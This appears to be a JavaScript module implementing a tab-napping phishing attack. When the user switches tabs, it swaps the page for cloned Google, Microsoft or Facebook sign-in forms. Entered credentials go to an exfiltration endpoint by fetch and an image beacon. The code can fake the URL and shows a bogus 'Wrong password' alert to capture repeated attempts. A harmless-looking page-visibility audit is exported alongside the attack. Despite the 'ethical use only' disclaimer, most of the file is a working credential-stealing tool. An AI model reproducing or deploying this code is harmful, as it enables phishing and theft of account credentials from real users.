/**
 * tab_napping.js — Stealthy Tab Napping / Page Replacement Attack
 *
 * This module provides:
 *   1. `tabnappOnBlur()` – a weaponized function that waits for the user to
 *      switch away from the current tab (visibilitychange / blur) and then
 *      replaces the page content with a fake login screen (Google, Microsoft,
 *      etc.). Credentials entered are silently harvested and exfiltrated.
 *      Designed for red‑team authorised phishing simulations.
 *
 *   2. Default export – a Pinpoint‑compatible `Page_Visibility_Audit` that
 *      audits `document.visibilityState` and `document.hidden` support.
 *
 * **Ethical use only.** Unauthorised use is illegal.
 */

// ---------------------------------------------------------------------------
// 1. Tab Napping Engine
// ---------------------------------------------------------------------------

/**
 * Default phishing page templates.
 */
const PHISH_TEMPLATES = {
    google: {
        title: 'Sign in – Google Accounts',
        logo: 'G',
        heading: 'Sign in',
        subheading: 'to continue to Gmail',
        emailPlaceholder: 'Email or phone',
        passwordPlaceholder: 'Enter your password',
        buttonLabel: 'Next',
        color: '#1a73e8',
        bgColor: '#fff',
    },
    microsoft: {
        title: 'Sign in to your account',
        logo: 'M',
        heading: 'Sign in',
        subheading: '',
        emailPlaceholder: 'Email, phone, or Skype',
        passwordPlaceholder: 'Password',
        buttonLabel: 'Next',
        color: '#0067b8',
        bgColor: '#fff',
    },
    facebook: {
        title: 'Log in to Facebook',
        logo: 'f',
        heading: 'Log in to Facebook',
        subheading: '',
        emailPlaceholder: 'Email address or phone number',
        passwordPlaceholder: 'Password',
        buttonLabel: 'Log In',
        color: '#1877f2',
        bgColor: '#f0f2f5',
    },
};

/**
 * Injects a full‑page phishing form that replaces the current document body.
 * The URL bar is faked via history.pushState when possible.
 *
 * @param {Object}   options
 * @param {string}   [options.provider='google']   – template key or 'custom'.
 * @param {Object}   [options.customTemplate]      – if provider='custom', provide { title, heading, ... }.
 * @param {string}   [options.exfilEndpoint]       – URL to send captured credentials.
 * @param {boolean}  [options.fakeURL=false]       – if true, push a fake URL via history.
 * @param {boolean}  [options.keepPersistent=true] – keep the phishing page after user returns? If false, restore original on focus.
 * @param {Function} [options.onCredentialCapture]  – callback({ email, password }).
 * @returns {Promise<void>}
 */
async function replacePageWithPhish(options = {}) {
    const {
        provider = 'google',
        customTemplate = null,
        exfilEndpoint = null,
        fakeURL = false,
        keepPersistent = true,
        onCredentialCapture = null,
    } = options;

    const template = provider === 'custom' ? customTemplate : PHISH_TEMPLATES[provider] || PHISH_TEMPLATES.google;
    const {
        title,
        heading,
        subheading,
        emailPlaceholder,
        passwordPlaceholder,
        buttonLabel,
        color,
        bgColor,
    } = template;

    // Save original document state if we ever want to restore
    const originalTitle = document.title;
    const originalBodyHTML = document.body.innerHTML;
    const originalBodyAttrs = document.body.getAttributeNames().reduce((acc, attr) => {
        acc[attr] = document.body.getAttribute(attr);
        return acc;
    }, {});

    // Attempt to change the visible URL
    if (fakeURL) {
        try {
            const fakePath = provider === 'google' ? '/signin/v2/identifier' : '/login';
            window.history.pushState({ tabNapping: true }, '', fakePath);
        } catch (_) { }
    }

    // Replace title
    document.title = title;

    // Build the phishing form
    const phishingHTML = `
    <div id="__tabnapp_phish" style="
      position: fixed; top:0; left:0; width:100%; height:100%;
      background: ${bgColor}; display: flex; align-items: center; justify-content: center;
      font-family: 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
      z-index: 999999;">
      <div style="max-width: 400px; width: 100%; padding: 48px 40px 36px; background: white;
        border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center;">
        <div style="margin-bottom: 24px; font-size: 32px; font-weight: 500; color: ${color};">${template.logo || '🔑'}</div>
        <h1 style="font-size: 24px; font-weight: 400; margin:0 0 8px;">${heading}</h1>
        ${subheading ? `<p style="font-size: 16px; color: #5f6368; margin:0 0 24px;">${subheading}</p>` : ''}
        <div style="margin-bottom: 16px;">
          <input id="__tabnapp_email" type="email" autocomplete="username"
            placeholder="${emailPlaceholder}"
            style="width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid #dadce0;
              border-radius: 4px; box-sizing: border-box;">
        </div>
        <div style="margin-bottom: 24px;">
          <input id="__tabnapp_password" type="password" autocomplete="current-password"
            placeholder="${passwordPlaceholder}"
            style="width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid #dadce0;
              border-radius: 4px; box-sizing: border-box;">
        </div>
        <button id="__tabnapp_submit" style="
          background: ${color}; color: white; border: none; padding: 10px 24px;
          border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer;
          width: 100%;">${buttonLabel}</button>
      </div>
    </div>
  `;

    // Replace the body content
    document.body.innerHTML = '';
    document.body.style.margin = '0';
    document.body.style.padding = '0';
    document.body.insertAdjacentHTML('afterbegin', phishingHTML);

    // --- Harvest credentials ---
    const submitHandler = (e) => {
        e.preventDefault();
        const email = document.getElementById('__tabnapp_email')?.value?.trim();
        const password = document.getElementById('__tabnapp_password')?.value?.trim();
        if (!email || !password) return;

        // Exfiltrate
        const credentials = { email, password, url: window.location.href, timestamp: Date.now() };
        if (exfilEndpoint) {
            // Fire‑and‑forget via fetch or image beacon
            try {
                fetch(exfilEndpoint, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify(credentials),
                    headers: { 'Content-Type': 'application/json' },
                });
            } catch (_) { }
            // Also try image beacon as fallback
            const payload = btoa(JSON.stringify(credentials)).replace(/=+$/, '');
            new Image().src = `${exfilEndpoint}?d=${payload}`;
        }
        if (onCredentialCapture) {
            try { onCredentialCapture(credentials); } catch (_) { }
        }

        // Optional: display error message to keep user trapped
        alert('Wrong password. Please try again.');
        document.getElementById('__tabnapp_password').value = '';
        document.getElementById('__tabnapp_password').focus();
    };

    const submitBtn = document.getElementById('__tabnapp_submit');
    submitBtn.addEventListener('click', submitHandler);
    // Also on Enter
    document.addEventListener('keydown', function enterHandler(e) {
        if (e.key === 'Enter') {
            submitHandler(e);
        }
    });

    // Return a function that can restore the original page (if not persistent)
    const restoreOriginal = () => {
        document.title = originalTitle;
        document.body.innerHTML = originalBodyHTML;
        // Restore body attributes
        for (const [attr, val] of Object.entries(originalBodyAttrs)) {
            document.body.setAttribute(attr, val);
        }
        // Remove URL manipulation
        if (fakeURL) {
            try {
                window.history.back();
            } catch (_) { }
        }
    };

    return { restoreOriginal };
}

// ---------- Main exported function ----------
/**
 * Sets up a listener that executes a tab napping attack when the user switches
 * away from the current tab (visibilitychange or blur). The page content is
 * replaced by a fake login screen to harvest credentials.
 *
 * @param {Object}   [options={}]
 * @param {string}   [options.provider='google']   - template key.
 * @param {number}   [options.delay=5000]          - time (ms) to wait after blur before triggering (0 = immediate).
 * @param {boolean}  [options.restoreOnFocus=false] - if true, restores original page when user returns (stealth mode).
 * @param {string}   [options.exfilEndpoint]       - URL to POST credentials.
 * @param {boolean}  [options.fakeURL=false]        - push a fake URL in address bar.
 * @param {Function} [options.onTrigger]            - callback when napping is triggered.
 * @param {Function} [options.onCredentialCapture]  - callback with {email, password}.
 * @returns {Function} A cleanup function that removes the listener and restores the page if needed.
 */
export function tabnappOnBlur(options = {}) {
    const {
        provider = 'google',
        delay = 5000,
        restoreOnFocus = false,
        exfilEndpoint = null,
        fakeURL = false,
        onTrigger = null,
        onCredentialCapture = null,
    } = options;

    let triggered = false;
    let restoreOriginalFn = null;
    let timerId = null;

    // Internal function: perform the attack
    const executeAttack = async () => {
        if (triggered) return;
        triggered = true;

        // Delay (if set) is handled by the caller; we are called after timer.
        if (onTrigger) {
            try { onTrigger(); } catch (_) { }
        }

        const result = await replacePageWithPhish({
            provider,
            exfilEndpoint,
            fakeURL,
            keepPersistent: !restoreOnFocus,
            onCredentialCapture,
        });
        restoreOriginalFn = result.restoreOriginal;

        // If restoreOnFocus, set up a listener to revert when user returns
        if (restoreOnFocus) {
            const focusHandler = () => {
                if (restoreOriginalFn) {
                    restoreOriginalFn();
                    document.removeEventListener('visibilitychange', focusHandler);
                    window.removeEventListener('focus', focusHandler);
                    triggered = false; // allow re‑napping
                }
            };
            document.addEventListener('visibilitychange', () => {
                if (document.visibilityState === 'visible') {
                    focusHandler();
                }
            });
            window.addEventListener('focus', focusHandler);
        }
    };

    // Detect tab switching: visibilitychange is the most reliable.
    const visibilityHandler = () => {
        if (document.visibilityState === 'hidden') {
            // Start delay timer
            if (!triggered && !timerId) {
                timerId = setTimeout(() => {
                    timerId = null;
                    executeAttack();
                }, delay);
            }
        } else {
            // Visible again: clear timer if attack not yet triggered
            if (timerId) {
                clearTimeout(timerId);
                timerId = null;
            }
        }
    };

    // Also listen for 'blur' as fallback
    const blurHandler = () => {
        if (!triggered && !timerId) {
            timerId = setTimeout(() => {
                timerId = null;
                executeAttack();
            }, delay);
        }
    };

    document.addEventListener('visibilitychange', visibilityHandler);
    window.addEventListener('blur', blurHandler);

    // Return cleanup function
    return function stopTabnapping() {
        document.removeEventListener('visibilitychange', visibilityHandler);
        window.removeEventListener('blur', blurHandler);
        if (timerId) clearTimeout(timerId);
        if (restoreOriginalFn) restoreOriginalFn();
    };
}

// ---------------------------------------------------------------------------
// 2. Pinpoint Page Visibility Audit (default export)
// ---------------------------------------------------------------------------

const pinpointModule = {
    id: 'tab_napping',
    title: 'Page_Visibility_Audit',
    level: 5,
    info: "Audits document.visibilityState and document.hidden API support.",
    steps: [
        "Read document.visibilityState.",
        "Inspect document.hidden boolean.",
    ],
    run: async () => {
        return {
            visibilityStateSupported: typeof document.visibilityState !== 'undefined',
            currentVisibilityState: document.visibilityState || 'unknown',
            isHidden: document.hidden || false,
        };
    },
};

export default pinpointModule;